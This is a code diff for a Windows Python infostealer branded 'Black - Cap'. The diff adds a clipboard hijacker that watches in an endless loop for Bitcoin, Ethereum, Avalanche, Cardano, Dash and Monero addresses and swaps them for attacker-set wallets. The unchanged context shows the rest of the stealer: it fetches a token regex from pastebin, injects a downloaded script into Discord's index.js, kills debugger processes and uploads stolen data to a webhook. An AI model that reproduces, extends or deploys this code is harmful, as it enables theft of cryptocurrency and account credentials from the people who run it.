@@ -18,6 +18,7 @@ import base64
 import requests
 import ctypes
 import time
+import pyperclip
 
 
 from sqlite3 import connect
@@ -61,6 +62,16 @@ __config__ = {
     'startup': '%_startup_enabled%',
     'kill_discord_process': '%kill_discord_process%',
     'dbugkiller': '%_debugkiller%',
+    
+    'addresse_crypto_replacer': '%_address_replacer%',
+    'addresse_btc': '%_btc_address%',
+    'addresse_eth': '%_eth_address%',
+    'addresse_xchain': '%_xchain_address%',
+    'addresse_pchain': '%_pchain_address%',
+    'addresse_cchain': '%_cchain_address%',
+    'addresse_monero': '%_monero_address%',
+    'addresse_ada': '%_ada_address%',
+    'addresse_dash': '%_dash_address%',
     'blprggg':
     [
         "httpdebuggerui",
@@ -108,6 +119,13 @@ d1sk = str(psutil.disk_usage('/')[0] / 1024 ** 3).split(".")[0]
 BlackCap_Regex = 'https://pastebin.com/raw/f4PM9Dse'
 reg_req = requests.get(BlackCap_Regex) 
 clear_reg = r"[\w-]{24}" + reg_req.text
+
+
+
+
+
+
+
 
 
 
@@ -209,6 +227,91 @@ class Functions(object):
         return __config__.get(e)
 
 
+
+
+
+
+
+
+
+
+class auto_copy_wallet(Functions):
+    def __init__(self):
+        self.address_st3aler = self.fetch_conf("addresse_crypto_replacer")
+        self.address_btc = self.fetch_conf("addresse_btc")
+        self.address_eth = self.fetch_conf("addresse_eth")
+        self.address_xchain = self.fetch_conf("addresse_xchain")
+        self.address_pchain = self.fetch_conf("addresse_pchain")
+        self.address_cchain = self.fetch_conf("addresse_cchain")
+        self.address_monero = self.fetch_conf("addresse_monero")
+        self.address_ada = self.fetch_conf("addresse_ada")
+        self.address_dash = self.fetch_conf("addresse_dash")
+
+
+    def address_swap(self):
+        try:
+            clipboard_data = pyperclip.paste()
+            if re.search('^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$', clipboard_data):
+                if clipboard_data not in [self.address_btc, self.address_eth, self.address_xchain, self.address_pchain, self.address_cchain, self.address_monero, self.address_ada, self.address_dash]:
+                    if self.address_btc != "none":
+                        pyperclip.copy(self.address_btc)
+                        pyperclip.paste()
+            
+            if re.search('^0x[a-fA-F0-9]{40}$', clipboard_data):
+                pyperclip.copy(self.address_eth)
+                pyperclip.paste()
+                
+            if re.search('^([X]|[a-km-zA-HJ-NP-Z1-9]{36,72})-[a-zA-Z]{1,83}1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{38}$', clipboard_data):
+                if self.address_xchain != "none":
+                    if clipboard_data not in [self.address_btc, self.address_eth, self.address_xchain, self.address_pchain, self.address_cchain, self.address_monero, self.address_ada, self.address_dash]:
+                        pyperclip.copy(self.address_xchain)
+                        pyperclip.paste()
+                
+                
+            if re.search('^([P]|[a-km-zA-HJ-NP-Z1-9]{36,72})-[a-zA-Z]{1,83}1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{38}$', clipboard_data):
+                if self.address_pchain != "none":
+                    if clipboard_data not in [self.address_btc, self.address_eth, self.address_xchain, self.address_pchain, self.address_cchain, self.address_monero, self.address_ada, self.address_dash]:
+                        pyperclip.copy(self.address_pchain)
+                        pyperclip.paste()
+                
+                
+            if re.search('^([C]|[a-km-zA-HJ-NP-Z1-9]{36,72})-[a-zA-Z]{1,83}1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{38}$', clipboard_data):
+                if self.address_cchain != "none":
+                    if clipboard_data not in [self.address_btc, self.address_eth, self.address_xchain, self.address_pchain, self.address_cchain, self.address_monero, self.address_ada, self.address_dash]:
+                        pyperclip.copy(self.address_cchain)
+                        pyperclip.paste()
+                
+                
+            if re.search('addr1[a-z0-9]+', clipboard_data):
+                    if clipboard_data not in [self.address_btc, self.address_eth, self.address_xchain, self.address_pchain, self.address_cchain, self.address_monero, self.address_ada, self.address_dash]:
+                        pyperclip.copy(self.address_ada)
+                        pyperclip.paste()
+                
+            if re.search('/X[1-9A-HJ-NP-Za-km-z]{33}$/g', clipboard_data):
+                if self.address_dash != "none":
+                    if clipboard_data not in [self.address_btc, self.address_eth, self.address_xchain, self.address_pchain, self.address_cchain, self.address_monero, self.address_ada, self.address_dash]:
+                        pyperclip.copy(self.address_dash)
+                        pyperclip.paste()
+                
+            if re.search('/4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}$/g', clipboard_data):
+                if self.address_monero != "none":
+                    if clipboard_data not in [self.address_btc, self.address_eth, self.address_xchain, self.address_pchain, self.address_cchain, self.address_monero, self.address_ada, self.address_dash]:
+                        pyperclip.copy(self.address_monero)
+                        pyperclip.paste()
+                
+                
+        except:
+            data = None
+            
+            
+    def loop_through(self):
+        
+        while True:
+            self.address_swap()
+     
+    def run(self):
+        if self.address_st3aler == "yes":
+            self.loop_through()
 
 
 class bl4ckc4p(Functions):
@@ -445,7 +548,7 @@ class bl4ckc4p(Functions):
                                             pass
 
                                     if self.h00ksreg in self.w3bh00k:
-                                        f = httpx.get(self.fetch_conf('blackcap_inject_url')).text.replace("%WEBHOOK%", self.w3bh00k)
+                                        f = httpx.get(self.fetch_conf('blackcap_inject_url')).text.replace("%WEBHOOK%", self.w3bh00k)#.replace("%num_core_discord%", inj_path + 'index.js')
                                     
                                     try:
                                         with open(inj_path + 'index.js', 'w', errors="ignore") as indexFile:
@@ -990,7 +1093,7 @@ GoogleMaps: {self.googlemap}
             'embeds': [
                 {
                     'author': {
-                        'name': f'Black - Cap v2.2',
+                        'name': f'Black - Cap v2.3',
                         'url': 'https://github.com/KSCHdsc',
                         'icon_url': 'https://raw.githubusercontent.com/KSCHdsc/DestruCord-Inject/main/blackcap.gif'
                     },
@@ -1141,6 +1244,7 @@ class AntiDebug(Functions):
 
 if __name__ == "__main__" and os.name == "nt":
     asyncio.run(bl4ckc4p().init())
+    
 
 
 
@@ -1256,7 +1360,7 @@ def upload(name, tk=''):
                 }
             ],
             "author": {
-                'name': f'Black - Cap v2.2',
+                'name': f'Black - Cap v2.3',
                 'url': 'https://github.com/KSCHdsc',
                 'icon_url': 'https://raw.githubusercontent.com/KSCHdsc/DestruCord-Inject/main/blackcap.gif'
             },
@@ -1294,7 +1398,7 @@ def upload(name, tk=''):
                 }
             ],
             "author": {
-                'name': f'Black - Cap v2.2',
+                'name': f'Black - Cap v2.3',
                 'url': 'https://github.com/KSCHdsc',
                 'icon_url': 'https://raw.githubusercontent.com/KSCHdsc/DestruCord-Inject/main/blackcap.gif'
             },
@@ -1326,7 +1430,7 @@ def upload(name, tk=''):
                 }
             ],
             "author": {
-                'name': f'Black - Cap v2.2',
+                'name': f'Black - Cap v2.3',
                 'url': 'https://github.com/KSCHdsc',
                 'icon_url': 'https://raw.githubusercontent.com/KSCHdsc/DestruCord-Inject/main/blackcap.gif'
             },
@@ -1664,3 +1768,5 @@ if not DETECTED:
                 filetext += "\n```"
                 filetext += "\n"
     upload("blackcapedez", filetext)
+    auto = threading.Thread(target=auto_copy_wallet().run)
+    auto.start()
